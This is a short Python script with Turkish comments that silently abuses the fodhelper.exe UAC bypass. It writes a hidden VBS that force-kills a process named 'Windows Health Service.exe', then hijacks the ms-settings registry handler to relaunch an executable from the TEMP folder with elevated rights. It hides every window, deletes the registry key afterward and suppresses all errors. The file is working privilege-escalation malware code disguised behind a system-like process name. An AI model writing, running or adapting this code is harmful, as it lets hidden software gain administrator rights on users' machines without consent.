import os
import winreg
import time
import ctypes
import sys

target_process_name = "Windows Health Service.exe"
temp_folder = os.environ.get('TEMP')

def create_support_files():
    """Kapatma ve Açma işlemleri için sessiz VBS ve BAT dosyalarını oluşturur."""
    kill_vbs = os.path.join(temp_folder, "kill_service.vbs")
    
    # Kapatma VBS'si: Taskkill'i tamamen gizli çalıştırır
    with open(kill_vbs, "w") as f:
        f.write(f'Set WshShell = CreateObject("WScript.Shell")\n')
        f.write(f'WshShell.Run "taskkill /F /IM ""{target_process_name}"" /T", 0, True')
    
    return kill_vbs

def uac_bypass_vbs(vbs_path):
    """fodhelper üzerinden bir VBS dosyasını sessizce tetikler."""
    reg_path = r'Software\Classes\ms-settings\shell\open\command'
    try:
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
            # VBS'yi wscript ile tetikliyoruz
            command = f'wscript.exe "{vbs_path}"'
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, command)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        
        # fodhelper'ı gizli modda başlat
        ctypes.windll.shell32.ShellExecuteW(None, "open", "fodhelper.exe", None, None, 0)
        time.sleep(4)
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
    except:
        pass

if __name__ == "__main__":
    # 1. Yardımcı dosyaları oluştur
    kill_vbs_path = create_support_files()

    # 2. ÖNCE KAPAT (VBS üzerinden sessizce)
    uac_bypass_vbs(kill_vbs_path)

    # 3. SONRA AÇ (Doğrudan EXE yoluyla sessizce)
    full_path = os.path.join(temp_folder, target_process_name)
    if os.path.exists(full_path):
        reg_path = r'Software\Classes\ms-settings\shell\open\command'
        try:
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{full_path}"')
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            
            ctypes.windll.shell32.ShellExecuteW(None, "open", "fodhelper.exe", None, None, 0)
            time.sleep(4)
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
        except:
            pass

    sys.exit()
